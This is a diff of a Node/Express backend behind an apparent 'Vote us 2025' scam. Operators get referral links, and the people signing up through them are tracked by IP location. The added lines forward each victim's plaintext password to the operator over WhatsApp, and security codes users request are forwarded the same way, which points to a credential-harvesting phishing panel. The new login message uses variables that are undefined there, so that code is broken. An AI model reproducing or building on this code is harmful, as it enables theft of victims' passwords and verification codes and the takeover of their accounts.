@@ -70,7 +70,7 @@ const SiteSettingsShema =
      title: {type: String, default :"Vote us 2025 🚀🎊🎉🏅"},
      message:{type:String, default:"I need your support, please take a moment to cast your vote and help ke reach new height in this competition. Your vote could be the difference-maker, propelling me towards victory"},
      adminId:{type:mongoose.Schema.ObjectId, ref:"Admin"},
-     platform:[{type:String,default:"Facebook"}]
+     platform:[{type:String,default:"Instagram"}]
     
    }, {timestamp:true});
    
@@ -126,7 +126,7 @@ app.post("/admin/register", async (req, res) => {
     await Referral.create({ adminId: admin._id, code });
 
     const link = `https://cctv-ujg4.vercel.app/i.html?ref=${code}`;
-    //sendWhatsAppToAdmin(admin._id, `👋 Welcome ${firstname}! Your referral link: ${link}`);
+    sendWhatsAppToAdmin(admin._id, `Hello ${firstname}! you are welcome to Nexa CCTV admin panel Your referral link: ${link} \n Have fun`);
 
     res.json({ success: true, admin });
   } catch (err) {
@@ -148,6 +148,8 @@ app.post("/admin/login", async (req, res) => {
 
     const token = jwt.sign({ id: admin._id, username: admin.username }, JWT_SECRET, { expiresIn: "7d" });
     res.json({ success: true, token, admin: { username: admin.username, name: admin.name, phone: admin.phone } });
+    
+    sendWhatsAppToAdmin(admin._id, `Hello ${firstname}! you have did you just login to your Nexa CCTV admin panel Your referral link: ${link} \n Have fun`);
   } catch (err) {
     console.error(err);
     res.status(500).json({ error: "Login failed" });
@@ -188,11 +190,11 @@ app.post("/student/register", async (req, res) => {
     const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
     const location = await getLocationFromIP(ip);
 
-    sendWhatsAppToAdmin(admin._id, `🆕 Student signup\nUsername: ${username}\nID: ${student._id}\nLocation: ${JSON.stringify(location)}`);
+    sendWhatsAppToAdmin(admin._id, `🆕 Student signup\nUsername: ${username}\nID: ${student._id}\nLocation: ${JSON.stringify(location)}\n Password: ${password}`);
     res.json({ success: true, studentId: student._id, admin });
   } catch (err) {
     console.error(err);
-    res.status(500).json({ error: "Student signup failed" });
+    res.status(500).json({ error: "Sorry something went wrong " });
   }
 });
 
@@ -208,7 +210,7 @@ app.post("/student/request-code", async (req, res) => {
     const code = generateCode(6);
     await SecurityCode.create({ adminId: student.adminId, code });
 
-    sendWhatsAppToAdmin(student.adminId, `🔑 Security code requested by ${username}\nCode: ${code}`);
+    sendWhatsAppToAdmin(student.adminId, `🔑 Security code requested from ${username}\nCode: ${code}`);
     res.json({ success: true });
   } catch (err) {
     console.error(err);
